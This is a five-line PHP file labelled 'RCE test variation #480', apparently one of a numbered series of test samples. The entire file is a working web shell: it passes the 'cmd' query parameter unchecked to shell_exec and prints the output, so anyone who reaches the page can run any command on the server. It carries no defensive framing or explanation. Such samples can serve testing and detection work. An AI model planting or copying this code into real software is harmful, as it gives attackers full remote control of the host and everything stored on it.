<?php
// RCE test variation #480
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>